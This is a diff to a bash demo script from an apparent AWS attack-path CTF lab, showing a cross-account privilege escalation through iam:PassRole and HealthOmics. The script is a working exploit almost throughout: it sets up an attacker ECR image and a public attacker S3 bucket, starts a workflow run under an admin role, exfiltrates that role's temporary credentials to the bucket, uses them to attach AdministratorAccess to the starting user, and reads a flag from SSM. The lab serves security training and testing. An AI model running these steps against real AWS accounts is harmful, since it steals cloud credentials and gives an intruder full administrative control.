@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 # Cross-account demo script for iam:PassRole + omics:CreateWorkflow + omics:StartRun privilege escalation
 # This variant hosts the aws-cli container image in an attacker-controlled ECR repository (separate
@@ -29,12 +30,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -111,6 +114,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve readonly credentials for observation steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -121,6 +133,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
 echo "S3 Bucket (for --output-uri): $S3_BUCKET_NAME"
 echo "Region: $AWS_REGION"
@@ -129,17 +142,35 @@ echo -e "${GREEN}Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# Source demo permissions library for validation restriction
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"
+
+# Restrict helpful permissions during validation run
+restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -151,11 +182,12 @@ echo -e "${GREEN}Verified starting user identity${NC}\n"
 
 # Step 3: Get account IDs (victim + attacker)
 echo -e "${YELLOW}Step 3: Getting account IDs${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 VICTIM_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Victim Account ID: $VICTIM_ACCOUNT_ID"
 
-show_cmd "aws sts get-caller-identity --query 'Account' --output text --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text --profile $ATTACKER_PROFILE"
 ATTACKER_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text --profile "$ATTACKER_PROFILE" 2>&1)
 if [ $? -ne 0 ]; then
     echo -e "${RED}Error: Could not get attacker account identity using profile '$ATTACKER_PROFILE'${NC}"
@@ -173,8 +205,9 @@ echo -e "${GREEN}Retrieved account IDs${NC}\n"
 
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Unexpectedly have admin permissions already${NC}"
 else
@@ -207,7 +240,7 @@ echo -e "${GREEN}Docker is available${NC}"
 # 5b: Create ECR repository in attacker account
 echo ""
 echo "Creating ECR repository in attacker account..."
-show_cmd "aws ecr create-repository --repository-name $ATTACKER_ECR_REPO_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws ecr create-repository --repository-name $ATTACKER_ECR_REPO_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
 ECR_CREATE_RESULT=$(aws ecr create-repository \
     --repository-name "$ATTACKER_ECR_REPO_NAME" \
     --region "$AWS_REGION" \
@@ -264,7 +297,7 @@ POLICYEOF
 # Option C (victim account root only) may also work if HealthOmics uses the run role to pull:
 #   "Principal": { "AWS": "arn:aws:iam::${VICTIM_ACCOUNT_ID}:root" }
 
-show_cmd "aws ecr set-repository-policy --repository-name $ATTACKER_ECR_REPO_NAME --policy-text '...' --region $AWS_REGION --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws ecr set-repository-policy --repository-name $ATTACKER_ECR_REPO_NAME --policy-text '...' --region $AWS_REGION --profile $ATTACKER_PROFILE"
 echo "$ECR_REPO_POLICY" | aws ecr set-repository-policy \
     --repository-name "$ATTACKER_ECR_REPO_NAME" \
     --policy-text file:///dev/stdin \
@@ -280,7 +313,7 @@ echo -e "${GREEN}ECR repository policy set (omics service + victim account root)
 # 5d: Docker login to attacker ECR
 echo ""
 echo "Logging into attacker ECR registry..."
-show_cmd "aws ecr get-login-password --region $AWS_REGION --profile $ATTACKER_PROFILE | docker login --username AWS --password-stdin $ATTACKER_ECR_REGISTRY"
+show_cmd "Attacker" "aws ecr get-login-password --region $AWS_REGION --profile $ATTACKER_PROFILE | docker login --username AWS --password-stdin $ATTACKER_ECR_REGISTRY"
 aws ecr get-login-password \
     --region "$AWS_REGION" \
     --profile "$ATTACKER_PROFILE" | \
@@ -295,7 +328,7 @@ echo -e "${GREEN}Logged into attacker ECR${NC}"
 # 5e: Pull public aws-cli image (force amd64 -- HealthOmics runs on x86_64 instances)
 echo ""
 echo "Pulling public aws-cli image (amd64 -- HealthOmics requires x86_64)..."
-show_cmd "docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest"
+show_cmd "Attacker" "docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest"
 docker pull --platform linux/amd64 public.ecr.aws/aws-cli/aws-cli:latest 2>&1
 
 if [ $? -ne 0 ]; then
@@ -308,10 +341,10 @@ echo -e "${GREEN}Pulled aws-cli image (amd64)${NC}"
 ATTACKER_ECR_IMAGE_URI="${ATTACKER_ECR_REGISTRY}/${ATTACKER_ECR_REPO_NAME}:latest"
 echo ""
 echo "Tagging and pushing to attacker ECR..."
-show_cmd "docker tag public.ecr.aws/aws-cli/aws-cli:latest $ATTACKER_ECR_IMAGE_URI"
+show_cmd "Attacker" "docker tag public.ecr.aws/aws-cli/aws-cli:latest $ATTACKER_ECR_IMAGE_URI"
 docker tag public.ecr.aws/aws-cli/aws-cli:latest "$ATTACKER_ECR_IMAGE_URI"
 
-show_cmd "docker push $ATTACKER_ECR_IMAGE_URI"
+show_cmd "Attacker" "docker push $ATTACKER_ECR_IMAGE_URI"
 docker push "$ATTACKER_ECR_IMAGE_URI" 2>&1
 
 if [ $? -ne 0 ]; then
@@ -326,7 +359,7 @@ echo "Attacker bucket: $ATTACKER_BUCKET_NAME"
 echo "Using attacker profile: $ATTACKER_PROFILE"
 
 # Create the bucket in the attacker account
-show_cmd "aws s3api create-bucket --bucket $ATTACKER_BUCKET_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3api create-bucket --bucket $ATTACKER_BUCKET_NAME --region $AWS_REGION --profile $ATTACKER_PROFILE"
 if [ "$AWS_REGION" = "us-east-1" ]; then
     aws s3api create-bucket \
         --bucket "$ATTACKER_BUCKET_NAME" \
@@ -349,7 +382,7 @@ echo -e "${GREEN}Attacker bucket created${NC}"
 
 # Disable S3 Block Public Access on the bucket
 echo "Disabling S3 Block Public Access on attacker bucket..."
-show_cmd "aws s3api put-public-access-block --bucket $ATTACKER_BUCKET_NAME --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3api put-public-access-block --bucket $ATTACKER_BUCKET_NAME --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false --profile $ATTACKER_PROFILE"
 aws s3api put-public-access-block \
     --bucket "$ATTACKER_BUCKET_NAME" \
     --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false" \
@@ -382,7 +415,7 @@ BUCKET_POLICY=$(cat <<POLICYEOF
 POLICYEOF
 )
 
-show_cmd "aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET_NAME --policy '...' --profile $ATTACKER_PROFILE"
+show_cmd "Attacker" "aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET_NAME --policy '...' --profile $ATTACKER_PROFILE"
 echo "$BUCKET_POLICY" | aws s3api put-bucket-policy \
     --bucket "$ATTACKER_BUCKET_NAME" \
     --policy file:///dev/stdin \
@@ -494,7 +527,8 @@ cd /tmp/omics-workflow
 zip -j /tmp/omics-workflow.zip main.wdl > /dev/null 2>&1
 cd - > /dev/null
 
-show_attack_cmd "aws omics create-workflow --region $AWS_REGION --name $WORKFLOW_NAME --definition-zip fileb:///tmp/omics-workflow.zip --engine WDL --parameter-template '{\"s3_bucket\":{\"description\":\"S3 bucket for credential exfiltration\"},\"s3_key\":{\"description\":\"S3 key for credential output\"}}' --output json"
+use_starting_creds
+show_attack_cmd "Attacker" "aws omics create-workflow --region $AWS_REGION --name $WORKFLOW_NAME --definition-zip fileb:///tmp/omics-workflow.zip --engine WDL --parameter-template '{\"s3_bucket\":{\"description\":\"S3 bucket for credential exfiltration\"},\"s3_key\":{\"description\":\"S3 key for credential output\"}}' --output json"
 WORKFLOW_RESULT=$(aws omics create-workflow \
     --region $AWS_REGION \
     --name "$WORKFLOW_NAME" \
@@ -517,10 +551,11 @@ echo -e "${GREEN}HealthOmics workflow created${NC}\n"
 echo -e "${YELLOW}Step 8: Waiting for workflow to become ACTIVE${NC}"
 echo "Polling workflow state..."
 
+use_readonly_creds
 MAX_WAIT=300
 ELAPSED=0
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "aws omics get-workflow --region $AWS_REGION --id $WORKFLOW_ID --query 'status' --output text"
+    show_cmd "ReadOnly" "aws omics get-workflow --region $AWS_REGION --id $WORKFLOW_ID --query 'status' --output text"
     WORKFLOW_STATE=$(aws omics get-workflow \
         --region $AWS_REGION \
         --id "$WORKFLOW_ID" \
@@ -568,7 +603,8 @@ echo "HealthOmics output-uri: s3://$S3_BUCKET_NAME/output/ (victim bucket, requi
 
 EXFIL_KEY="exfil/creds.json"
 
-show_attack_cmd "aws omics start-run --region $AWS_REGION --workflow-id $WORKFLOW_ID --role-arn $ADMIN_ROLE_ARN --output-uri s3://$S3_BUCKET_NAME/output/ --parameters '{\"s3_bucket\":\"$ATTACKER_BUCKET_NAME\",\"s3_key\":\"$EXFIL_KEY\"}' --output json"
+use_starting_creds
+show_attack_cmd "Attacker" "aws omics start-run --region $AWS_REGION --workflow-id $WORKFLOW_ID --role-arn $ADMIN_ROLE_ARN --output-uri s3://$S3_BUCKET_NAME/output/ --parameters '{\"s3_bucket\":\"$ATTACKER_BUCKET_NAME\",\"s3_key\":\"$EXFIL_KEY\"}' --output json"
 RUN_RESULT=$(aws omics start-run \
     --region $AWS_REGION \
     --workflow-id "$WORKFLOW_ID" \
@@ -591,10 +627,11 @@ echo -e "${GREEN}Workflow run started${NC}\n"
 echo -e "${YELLOW}Step 10: Waiting for workflow run to complete${NC}"
 echo "Polling run status every 30 seconds (15 minute timeout)..."
 
+use_readonly_creds
 MAX_WAIT=900
 ELAPSED=0
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "aws omics get-run --region $AWS_REGION --id $RUN_ID --query 'status' --output text"
+    show_cmd "ReadOnly" "aws omics get-run --region $AWS_REGION --id $RUN_ID --query 'status' --output text"
     RUN_STATE=$(aws omics get-run \
         --region $AWS_REGION \
         --id "$RUN_ID" \
@@ -645,7 +682,8 @@ echo "The WDL workflow task extracted the admin run role's temporary credentials
 echo "and wrote them to s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY (attacker-controlled bucket)"
 echo "The bucket policy allows public GetObject, so the starting user can read it."
 
-show_cmd "aws s3 cp s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY /tmp/stolen_creds.json --region $AWS_REGION"
+use_starting_creds
+show_cmd "Attacker" "aws s3 cp s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY /tmp/stolen_creds.json --region $AWS_REGION"
 aws s3 cp "s3://$ATTACKER_BUCKET_NAME/$EXFIL_KEY" /tmp/stolen_creds.json \
     --region $AWS_REGION
 
@@ -674,14 +712,14 @@ export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"
 export AWS_REGION=$AWS_REGION
 
 # Verify we're now the admin role
-show_cmd "aws sts get-caller-identity"
+show_cmd "StolenAdmin" "aws sts get-caller-identity"
 STOLEN_IDENTITY=$(aws sts get-caller-identity --output json 2>&1)
 echo "$STOLEN_IDENTITY" | jq '.' 2>/dev/null || echo "$STOLEN_IDENTITY"
 echo ""
 
 # Attach AdministratorAccess to the starting user
 echo "Attaching AdministratorAccess to $STARTING_USER..."
-show_attack_cmd "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+show_attack_cmd "StolenAdmin" "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
 aws iam attach-user-policy \
     --user-name "$STARTING_USER" \
     --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
@@ -699,18 +737,17 @@ echo ""
 echo -e "${YELLOW}Step 13: Verifying privilege escalation${NC}"
 echo "Switching back to starting user credentials..."
 
-# Restore starting user credentials
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
-unset AWS_SESSION_TOKEN
-# Keep region consistent
+# Restore starting user credentials (use_starting_creds; not the stolen role creds)
+use_starting_creds
 export AWS_REGION=$AWS_REGION
 
 # Wait for IAM propagation
 echo "Waiting 15 seconds for IAM policy to propagate..."
 sleep 15
 
-show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
+# Use readonly creds to confirm the policy attachment via IAM read
+use_readonly_creds
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER" \
     --output json)
@@ -726,13 +763,16 @@ else
 fi
 echo ""
 
-echo "Attempting to list IAM users..."
-show_cmd "aws iam list-users --max-items 3 --output table"
+# Switch to starting user credentials to confirm their new admin access works
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+echo "Verifying starting user can now list IAM users (proves admin escalation worked)..."
+show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}Successfully listed IAM users as starting user!${NC}"
     echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
 else
-    echo -e "${RED}Failed to list users${NC}"
+    echo -e "${RED}Failed to list users as starting user${NC}"
     rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
     exit 1
 fi
@@ -741,9 +781,29 @@ echo ""
 # Clean up temporary files
 rm -rf /tmp/omics-workflow /tmp/omics-workflow.zip /tmp/stolen_creds.json
 
+# [EXPLOIT]
+# Step 14: Capture the CTF flag using the starting user's elevated credentials
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/omics-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL! (Cross-Account Variant)${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED! (Cross-Account Variant)${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with iam:PassRole, omics:CreateWorkflow, omics:StartRun)"
@@ -755,6 +815,7 @@ echo "6. Started workflow run passing admin role ($ADMIN_ROLE_NAME) via iam:Pass
 echo "7. Workflow task exfiltrated admin role credentials to attacker S3 bucket"
 echo "8. Retrieved stolen credentials and used them to attach AdministratorAccess to $STARTING_USER"
 echo "9. Achieved: Administrator Access"
+echo "10. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER"
@@ -762,6 +823,7 @@ echo "  -> (omics:CreateWorkflow with attacker ECR image)"
 echo "  -> (iam:PassRole + omics:StartRun with $ADMIN_ROLE_NAME)"
 echo "  -> Workflow task exfiltrates admin creds to attacker S3 bucket"
 echo "  -> Attacker retrieves creds -> (iam:AttachUserPolicy) -> Admin"
+echo "  -> (ssm:GetParameter) -> CTF Flag"
 
 echo -e "\n${YELLOW}Cross-Account Detail:${NC}"
 echo "  Victim Account:    $VICTIM_ACCOUNT_ID"
